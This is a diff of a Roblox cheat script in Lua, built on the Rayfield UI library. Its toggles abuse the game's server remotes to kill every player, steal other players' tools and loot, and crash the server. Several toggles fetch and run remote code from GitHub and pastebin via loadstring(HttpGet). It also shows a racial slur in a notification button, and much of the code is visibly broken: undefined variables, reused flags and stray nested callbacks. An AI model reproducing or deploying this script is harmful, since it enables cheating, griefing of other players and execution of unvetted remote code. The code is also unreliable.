+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(842, 5, -6)
+end
+})
+
+local Button = TeleportsTab:CreateButton({
+    Name = "Pharmacy",
+    Callback = function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(42, 5, -258)
+end
+})
+
+local Button = TeleportsTab:CreateButton({
+    Name = "Bank",
+    Callback = function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-535, 5, -347)
+end
+})
+
+local Button = TeleportsTab:CreateButton({
+    Name = "Cap Store",
+    Callback = function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-159, 5, 8)
+end
+})
+
+local Button = TeleportsTab:CreateButton({
+    Name = "Shit/Pant Store",
+    Callback = function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-125, 5, 38)
+end
+})
+
+local Button = TeleportsTab:CreateButton({
+    Name = "Chain Store",
+    Callback = function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(39, 5, -232)
+end
+})
+
+local Button = TeleportsTab:CreateButton({
+    Name = "Boxing Gym",
+    Callback = function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(258, 5, -99)
+end
+})
+
+local TeleportsSection = TeleportsTab:CreateSection("Dealer Teleports")
+
+local Button = TeleportsTab:CreateButton({
+    Name = "Card Dealer",
+    Callback = function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(226, 4, -543)
+end
+})
+
+local Button = TeleportsTab:CreateButton({
+    Name = "Illeagal Dealer",
+    Callback = function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-142, 5, 190)
+end
+})
+
+local TeleportsSection = TeleportsTab:CreateSection("Job Teleports")
+
+local Button = TeleportsTab:CreateButton({
+    Name = "Mop Job",
+    Callback = function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-102, 5, 20)
+end
+})
+
+local Button = TeleportsTab:CreateButton({
+    Name = "Pizza Job",
+    Callback = function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(163, 5, 49)
+end
+})
+
+local Button = TeleportsTab:CreateButton({
+    Name = "Box Job",
+    Callback = function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-118, 5, 300)
+end
+})
+
+local PlayerTab = Window:CreateTab("Player", 4483362458) -- Title, Image
+local PlayerSection = PlayerTab:CreateSection("Player")
+
+local Slider = PlayerTab:CreateSlider({
+   Name = "Walkspeed",
+   Range = {0, 300},
+   Increment = 1,
+   Suffix = "Speed",
+   CurrentValue = 16,
+   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
+   end,
+})
+
+local Toggle = PlayerTab:CreateToggle({
+   Name = "No Clip",
+   CurrentValue = false,
+   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+        local nocliptoggle = selfsector.element('Toggle', 'Noclip', false, function(v)
+    _G.noclip = v.Toggle
+
+    if not _G.noclip then
+        local character = game.Players.LocalPlayer.Character
+        if character then
+            for _, part in pairs(character:GetDescendants()) do
+                if part:IsA("BasePart") and part.Parent.Name ~= "Wings" then
+                    part.CanCollide = true
+                end
+            end
+        end
+    end
+    
+    while _G.noclip do
+        game:GetService("RunService").RenderStepped:wait()
+        local character = game.Players.LocalPlayer.Character
+        if character then
+            for _, part in pairs(character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = false
+                end
+            end
+        end
+    end
+end)
+  
+        end
+})
+
+local Toggle = PlayerTab:CreateToggle({
+   Name = "Fly V3",
+   CurrentValue = false,
+   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+   end,
+})
+
+local VehicleTab = Window:CreateTab("Vehicle", 4483362458) -- Title, Image
+local VehicleSection = VehicleTab:CreateSection("THIS TAB IS BUGGED - WIP")
+
+local Toggle = VehicleTab:CreateToggle({
+   Name = "Unlock All Cars",
+   CurrentValue = false,
+   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+                              _G.Unlock = v.Toggle
+                        while _G.Unlock do
+                            wait(0.5)
+                            for i,v in pairs(workspace.SpawnedVehicles:GetChildren()) do
+                                v.DriveSeat.Disabled = false
+                                    v.DriveSeat.CanTouch = true
+                            end
+                        end
+                            end})
+
+local ExtraTab = Window:CreateTab("Extra", 4483362458) -- Title, Image
+local ExtraSection = ExtraTab:CreateSection("Misc")
+
+local Toggle = PlayerTab:CreateToggle({
+   Name = "GodMode",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
@@ -542,360 +905,290 @@ local Toggle = GunTab:CreateToggle({
     end
 })
 
-local Toggle = GunTab:CreateToggle({
-   Name = "Unlock Firerate",
+local Toggle = ExtraTab:CreateToggle({
+   Name = "One Punch",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
-        local referencemodule = game.ReplicatedStorage.Assets.Tools:FindFirstChild("Custom GD")
+        _G.OnePunch = false 
 
--- Check if the reference module exists
-if not referencemodule then
-    Rayfield:Notify({
-        Title = "Error",
-        Content = "Reference module not found!",
-        Duration = 4,
-        Image = 4483362458,
-        Actions = {}
-    })
-    return
-end
-
--- Loop through all tools and clone the reference module
-for _, v in pairs(game.ReplicatedStorage.Assets.Tools:GetChildren()) do
-    local newv = referencemodule:Clone()
-    newv.Parent = game.ReplicatedStorage.Assets.Tools
-    newv.Name = v.Name
-
-    -- Remove existing "Sounds" if any, and transfer from the old tool
-    local existingSounds = newv:FindFirstChild("Sounds")
-    if existingSounds then
-        existingSounds:Destroy()
-    end
-
-    local oldSounds = v:FindFirstChild("Sounds")
-    if oldSounds then
-        oldSounds.Parent = newv
-    end
-
-    -- Destroy the old tool
-    v:Destroy()
-end
-
--- This global variable tracks whether the tool name is being fixed
-_G.FixingName = true
-
--- Continuously check for tool change and update UI
-while _G.FixingName do
-    task.wait()
-
-    local player = game.Players.LocalPlayer
-    local character = player.Character
-    if character then
-        local tool = character:FindFirstChildOfClass("Tool")
-        if tool then
-            local gunStatsUI = player.PlayerGui:FindFirstChild("GunUI") and player.PlayerGui.GunUI:FindFirstChild("GunStats")
-            if gunStatsUI then
-                local weaponText = gunStatsUI:FindFirstChild("Weapon")
-                if weaponText then
-                    weaponText.Text = "Modded " .. tool.Name
+local function activateTool()
+    local character = player.Character or player.CharacterAdded:Wait()
+    local tool = character:FindFirstChild("Fist")
+    
+    if tool and _G.OnePunch then
+        for _, target in ipairs(Players:GetPlayers()) do
+            if target ~= player and target.Character and target.Character:FindFirstChild("UpperTorso") then
+                local distance = (target.Character.UpperTorso.Position - character.RightHand.Position).Magnitude
+                
+                if distance <= 3 then
+                    tool.Script.legma:FireServer(target.Character.UpperTorso, target.Character.Humanoid.Health, character.RightHand)
+                    tool.Script.egma:FireServer(target.Character.UpperTorso, target.Character.Humanoid.Health, character.RightHand)
+                    return
                 end
             end
         end
     end
 end
 
+mouse.Button1Down:Connect(function()
+    activateTool()
+end)
+
+local nocliptoggle = selfsector.element('Toggle', 'One Punch', false, function(v)
+    _G.OnePunch = v.Toggle
+end)
+
+   end,
+    })
+
+local Toggle = ExtraTab:CreateToggle({
+   Name = "Kill All",
+   CurrentValue = false,
+   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+        for _, player in pairs(game.Players:GetChildren()) do
+            if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild("UpperTorso") then
+                local fist = game.Players.LocalPlayer.Backpack:FindFirstChild("Fist")
+                if fist and fist:FindFirstChild("Script") then
+                    fist.Script.egma:FireServer(player.Character.UpperTorso, player.Character.Humanoid.Health, game.Players.LocalPlayer.Character.RightHand)
+                    fist.Script.legma:FireServer(player.Character.UpperTorso, player.Character.Humanoid.Health, game.Players.LocalPlayer.Character.RightHand)
+                end
+            end
+            task.wait(0.3) -- Prevents overload
+        end
+        Rayfield:Notify({
+            Title = "Kill All Activated",
+            Content = "Attempted to kill all players.",
+            Duration = 4,
+            Image = 4483362458,
+            Actions = {}
+        })
+    end
+})
+
+local Toggle = ExtraTab:CreateToggle({
+   Name = "Tool Stealing",
+   CurrentValue = false,
+   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+        local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local function stealTool(targetPlayer)
+    local targetCharacter = targetPlayer.Character
+    if targetCharacter then
+        for _, tool in ipairs(targetCharacter:GetChildren()) do
+            if tool:IsA("Tool") then
+                tool.Parent = player.Backpack
+                print("Stole tool: " .. tool.Name .. " from " .. targetPlayer.Name)
+            end
+        end
+    end
+end
+
+for _, targetPlayer in ipairs(Players:GetPlayers()) do
+    if targetPlayer ~= player then
+        stealTool(targetPlayer)
+    end
+end
+
+Players.PlayerAdded:Connect(function(targetPlayer)
+    targetPlayer.CharacterAdded:Connect(function()
+        stealTool(targetPlayer)
+    end)
+end)
+
    end,
 })
 
-
-local Toggle = GunTab:CreateToggle({
-   Name = "Gun Dupe",
+local Toggle = ExtraTab:CreateToggle({
+   Name = "Spin Bot",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
         local player = game.Players.LocalPlayer
         local character = player.Character or player.CharacterAdded:Wait()
-        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
-        local safeZones = game.Workspace.SafeZones:GetChildren()
-        
-        local closestSafeZone = nil
-        local shortestDistance = math.huge 
+        local humanoid = character:WaitForChild("Humanoid")
+        local spinAnimationId = "rbxassetid://11475426274"  -- Replace with desired spin animation ID
+        local spinSpeed = 200 
 
-        for _, safeZone in ipairs(safeZones) do
-            local distance = (humanoidRootPart.Position - safeZone.Position).Magnitude
-            if distance < shortestDistance then
-                shortestDistance = distance
-                closestSafeZone = safeZone
+        local crouchAnimation = Instance.new("Animation")
+        crouchAnimation.AnimationId = spinAnimationId
+        local crouchAnimationTrack = humanoid:LoadAnimation(crouchAnimation)
+
+        -- Toggle the spin bot on/off based on the value
+        if Value then
+            -- Turn on Spin Bot
+            crouchAnimationTrack:Play()
+            while Value do
+                character:SetPrimaryPartCFrame(character.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0))
+                wait(0.001)
             end
-        end
-        
-        if closestSafeZone then
-            humanoidRootPart.CFrame = closestSafeZone.CFrame
-            character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead) 
+            crouchAnimationTrack:Stop()
         else
-            warn("No safe zones found.")
+            -- Turn off Spin Bot
+            crouchAnimationTrack:Stop()
         end
-    end
+   end,
 })
 
-local VisualsTab = Window:CreateTab("Visuals", 4483362458) -- Title, Image
-local VisualsSection = VisualsTab:CreateSection("Tool Stealing")
-
-local Toggle = VisualsTab:CreateToggle({
-   Name = "tool stealing",
+local Toggle = ExtraTab:CreateToggle({
+   Name = "Godmode All",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
-        _G.ToolStealing = state
-
-task.spawn(function()
-    while _G.ToolStealing do
-        local player = game.Players.LocalPlayer
-        local character = player and player.Character or nil
-        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
-
-        if humanoid then
-            for _, tool in pairs(workspace:GetChildren()) do
-                if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
-                    firetouchinterest(character.HumanoidRootPart, tool.Handle, 0)
-                    task.wait(0.1)
-                    firetouchinterest(character.HumanoidRootPart, tool.Handle, 1)
-                end
+        local toggle = section4.element('Button', 'Godmode All', false, function(v)
+    for i,v in pairs(game.Players:GetChildren()) do
+        wait(0.3)
+        print(v.Name)
+        if v.Character then
+            if v.Character:FindFirstChild("UpperTorso") then
+                game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
+                game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
+                wait()
+                game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
+                game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
             end
         end
-        
-        task.wait(1) -- Prevents excessive looping
     end
+    Notif:Notify("Attempted to godmode all", 4, "information")
 end)
 
    end,
 })
 
-
-local hitboxColor = Color3.fromRGB(255, 255, 255)  -- Default color
-
-local Slider = VisualsTab:CreateSlider({
-    Name = "Hitbox Size",
-    Range = {2, 30},
-    Increment = 1,
-    Suffix = "HBES",
-    CurrentValue = 2,
-    Flag = "HitboxSize",
-    Callback = function(size)
-        for _, player in pairs(game.Players:GetPlayers()) do
-            if player.Character and player ~= game.Players.LocalPlayer then
-                local hrp = player.Character:FindFirstChild("HumanoidRootPart")
-                if hrp then
-                    hrp.Size = Vector3.new(size, size, size)
-                    hrp.Transparency = 0.8
-                    hrp.BrickColor = BrickColor.new(hitboxColor)  -- Use the correct property for color
-                    hrp.CanCollide = false
-                end
-            end
-        end
-    end
-})
-
-local ColorPicker = VisualsTab:CreateColorPicker({
-    Name = "Hit Box Color",
-    Color = Color3.fromRGB(255,255,255),
-    Flag = "ColorPicker1", -- A flag is the identifier for the configuration file
-    Callback = function(Value)
-        -- The function that takes place every time the color picker is moved/changed
-        hitboxColor = Value  -- Update the hitbox color with the selected color
-    end
-})
-
-local EspTab = Window:CreateTab("Esp", 4483362458) -- Title, Image
-local EspSection = EspTab:CreateSection("Esp Features")
-
-local Toggle = EspTab:CreateToggle({
-   Name = "Name Tag Esp",
+local Toggle = ExtraTab:CreateToggle({
+   Name = "Instant Prompt",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
-         _G.ESPVisible = value
+        -- Loop Instant Proximity Prompt By DIR (TheUberAccount_x)
+local Workspace = game:GetService("Workspace")
 
-        -- Optional: Send a notification when the visibility changes
-        if _G.SendNotifications then
-            game:GetService("StarterGui"):SetCore("SendNotification", {
-                Title = "Exunys Developer",
-                Text = "The ESP's visibility is now set to " .. tostring(_G.ESPVisible) .. ".",
-                Duration = 5
-            })
+local function updateProximityPrompts()
+    for i, v in ipairs(Workspace:GetDescendants()) do
+        if v.ClassName == "ProximityPrompt" then
+            v.HoldDuration = 0.0001
         end
     end
+end
+
+updateProximityPrompts()
+
+Workspace.DescendantAdded:Connect(function(descendant)
+    if descendant.ClassName == "ProximityPrompt" then
+        descendant.HoldDuration = 0.0001
+    end
+end)
+
+game:GetService("StarterGui"):SetCore("SendNotification",{
+Title = "Instant Prompt ui",
+Text = "Made by theyfwdk", 
+
+Button1 = "ok nigga",
+Duration = 30 
+})
+   end,
 })
 
--- Optional: Add more UI elements (like text size, team check, etc.) for customization
+local TrollTab = Window:CreateTab("Troll", 4483362458) -- Title, Image
+local TrollSection = TrollTab:CreateSection("Main Troll")
 
--- Create other ESP settings (e.g., Text Size)
-local TextSizeSlider = ESPSection:CreateSlider({
-    Name = "Text Size",
-    Min = 10,
-    Max = 30,
-    Default = _G.TextSize,
-    Increment = 1,
-    Callback = function(value)
-        _G.TextSize = value
+local Toggle = TrollTab:CreateToggle({
+   Name = "Crash Server",
+   CurrentValue = false,
+   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+        local toggle = section4.element('Button', 'Crash Server', false, function(v)
+    game:GetService("RunService"):Set3dRenderingEnabled(false)
+    Notif:Notify("Started crashing, stay in a safezone.", 4, "information")
+    game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Save", _G.scriptname .. "ONTOP")
+
+    wait(3)
+    for i = 1, 20 do
+        game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Load", _G.scriptname .. "ONTOP")
     end
- })
+    wait(20)
+    game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Save", _G.scriptname .. "ONTOP")
 
-local MiscTab = Window:CreateTab("Misc", 4483362458) -- Title, Image
-local MiscSection = MiscTab:CreateSection("Fps/Lag")
-
-local Button = MiscTab:CreateButton({
-   Name = "Fps Boost",
-   Callback = function()
-        -- Settings
-local Settings = _G.FPS_Settings or {
-    Graphics = true,
-    Lighting = true,
-    Texture = true,
-    Terrain = true,
-    Effects = false
-}
-
--- Variables
-local sethiddenproperty = sethiddenproperty or set_hidden_property or set_hidden_prop
-local Lighting = game:GetService("Lighting")
-local Terrain = workspace.Terrain
-
--- Check if settings are valid and adjust render settings
-local success, RenderSettings, UserGameSettings
-if pcall(function()
-    RenderSettings = game:GetService("RenderSettings")
-    UserGameSettings = UserSettings():GetService("UserGameSettings")
-end) then
-    if Settings.Graphics then
-        RenderSettings.EagerBulkExecution = false
-        RenderSettings.QualityLevel = Enum.QualityLevel.Level01
-        RenderSettings.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level01
-        UserGameSettings.SavedQualityLevel = Enum.SavedQualitySetting.QualityLevel1
-        workspace.InterpolationThrottling = Enum.InterpolationThrottlingMode.Enabled
+    wait(3)
+    for i = 1, 20 do
+        game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Load", _G.scriptname .. "ONTOP")
     end
-end
+    wait(20)
+    game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Save", _G.scriptname .. "wONTOP")
 
--- Adjust lighting settings
-if Settings.Lighting then
-    Lighting.GlobalShadows = false
-    Lighting.FogEnd = 1e9
-
-    if sethiddenproperty then
-        pcall(sethiddenproperty, Lighting, "Technology", Enum.Technology.Compatibility)
+    wait(3)
+    for i = 1, 20 do
+        game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Load", _G.scriptname .. "wONTOP")
     end
-end
-
--- Adjust texture settings
-if Settings.Texture then
-    workspace.LevelOfDetail = Enum.ModelLevelOfDetail.Disabled
-
-    if sethiddenproperty then
-        pcall(sethiddenproperty, workspace, "MeshPartHeads", Enum.MeshPartHeads.Disabled)
-    end
-end
-
--- Adjust terrain settings
-if Settings.Terrain then
-    Terrain.WaterWaveSize = 0
-    Terrain.WaterWaveSpeed = 0
-    Terrain.WaterReflectance = 0
-    Terrain.WaterTransparency = 0
-
-    if sethiddenproperty then
-        pcall(sethiddenproperty, Terrain, "Decoration", false)
-    end
-end
-
--- Iterate through all descendants and apply settings
-for _, Object in ipairs(game:GetDescendants()) do
-    if Object:IsA("Sky") and Settings.Texture then
-        Object.StarCount = 0
-        Object.CelestialBodiesShown = false
-    elseif Object:IsA("BasePart") and Settings.Texture then
-        Object.Material = "SmoothPlastic"
-    elseif Object:IsA("BasePart") and Settings.Lighting then
-        Object.CastShadow = false
-    elseif Object:IsA("Atmosphere") and Settings.Lighting then
-        Object.Density = 0
-        Object.Offset = 0
-        Object.Glare = 0
-        Object.Haze = 0
-    elseif Object:IsA("SurfaceAppearance") and Settings.Texture then
-        Object:Destroy()
-    elseif (Object:IsA("Decal") or Object:IsA("Texture")) and string.lower(Object.Parent.Name) ~= "head" and Settings.Texture then
-        Object.Transparency = 1
-    elseif (Object:IsA("ParticleEmitter") or Object:IsA("Sparkles") or Object:IsA("Smoke") or Object:IsA("Trail") or Object:IsA("Fire")) and Settings.Effects then
-        Object.Enabled = false
-    elseif (Object:IsA("ColorCorrectionEffect") or Object:IsA("DepthOfFieldEffect") or Object:IsA("SunRaysEffect") or Object:IsA("BloomEffect") or Object:IsA("BlurEffect")) and Settings.Lighting then
-        Object.Enabled = false
-    end
-end
+    wait(20)
+    game:GetService("ReplicatedStorage").Ragdoll:FireServer(true)
+end)
 
    end,
 })
 
-local Button = MiscTab:CreateButton({
-   Name = "Anti Lag",
-   Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/LiverMods/Tests/main/File/Antilag.lua"))()
+local Toggle = TrollTab:CreateToggle({
+   Name = "Fling All",
+   CurrentValue = false,
+   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+        local executed = false
+
+local function closeScript()
+    executed = true
+    StopButton.Visible = false
+end
+
+local Gui = Instance.new("ScreenGui")
+Gui.Parent = game.Players.LocalPlayer.PlayerGui
+
+local StopButton = Instance.new("TextButton")
+StopButton.Parent = Gui
+StopButton.Position = UDim2.new(0.5, -50, 0.6, 0)
+StopButton.Size = UDim2.new(0, 100, 0, 50)
+StopButton.Text = "Stop Script"
+StopButton.TextSize = 24 -- Increase text size to 24
+StopButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black Background
+StopButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White Text
+StopButton.Font = Enum.Font.Gotham -- Set font to Gotham
+StopButton.MouseButton1Click:Connect(closeScript)
+
+local StarterGui = game:GetService("StarterGui")
+StarterGui:SetCore("SendNotification", {
+    Title = "SUBSCRIBE TO PHILLYMADEMARE",
+    Text = "Credits To AnthonyIsHere"
+})
+
+while true and not executed do
+    wait(2)
+    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+end
    end,
 })
 
--- Assuming you have the Rayfield module
-local rayfieldUI = require(game:GetService("ReplicatedStorage"):WaitForChild("Rayfield")) -- Make sure this is the correct path to the Rayfield module
-
--- Create the text box UI element
-local Input = MiscTab:CreateInput({
-    Name = "custom name", -- This name can be changed based on your design
-    PlaceholderText = "Enter your name here", -- Optional placeholder text
-    Text = "", -- Start with an empty text
-})
-
--- Listen for text change events when the player types in the box
-nameInputBox:GetPropertyChangedSignal("Text"):Connect(function()
-    local newName = nameInputBox.Text -- Get the updated name
-
-    -- Loop through all players and update their name labels
-    for _, player in pairs(game.Players:GetPlayers()) do
-        local character = player.Character
-        if character and character:FindFirstChild("Head") then
-            local nameGui = character.Head:FindFirstChild("NameGui")
-            if nameGui and nameGui:FindFirstChild("Main") then
-                local nameLabel = nameGui.Main:FindFirstChild("Name")
-                if nameLabel then
-                    nameLabel.Text = newName -- Set the name to whatever the player typed
-                end
-            end
+local Toggle = TrollTab:CreateToggle({
+   Name = "Loot All",
+   CurrentValue = false,
+   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+        local lootstealingshit = gunsection.element('Toggle', 'Loot Stealing', false, function(v)
+    _G.LootStealing = v.Toggle
+    while _G.LootStealing do
+        wait(0.5)
+        for i,v in pairs(game.Players:GetChildren()) do
+            spawn(function()
+                local args = {
+                    [1] = v
+                }
+                
+                game:GetService("ReplicatedStorage"):WaitForChild("LootPlayerRF"):InvokeServer(unpack(args))
+            end)
         end
     end
 end)
 
--- Assuming this is inside a GUI context with Rayfield and a TextBox
-local Rayfield = require(game:GetService("ReplicatedStorage"):WaitForChild("Rayfield")) -- Or wherever Rayfield is loaded from
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local UpdatePlayerNameEvent = ReplicatedStorage:WaitForChild("UpdatePlayerName")
-
--- Create a new TextBox in the Rayfield UI (if not already created)
-local Input = MiscTab:CreateInput({
-    Name = "PlayerNameInput", -- Name of the textbox
-    PlaceholderText = "Enter New Name", -- Placeholder text
-    Text = "", -- Default text (blank initially)
-    Size = UDim2.new(0, 200, 0, 40), -- Size of the textbox
-    Position = UDim2.new(0.5, -100, 0.5, -20), -- Position of the textbox on screen
+   end,
 })
-
--- Function to send the new name to the server
-local function sendNameToServer(newName)
-    UpdatePlayerNameEvent:FireServer(newName)  -- Send the name change request to the server
-end
-
--- Ensure the text box works
-textbox:GetPropertyChangedSignal("Text"):Connect(function()
-    local newName = textbox.Text
-    if newName ~= "" then
-        sendNameToServer(newName)  -- Call function to send the new name to the server
-    end
-end)
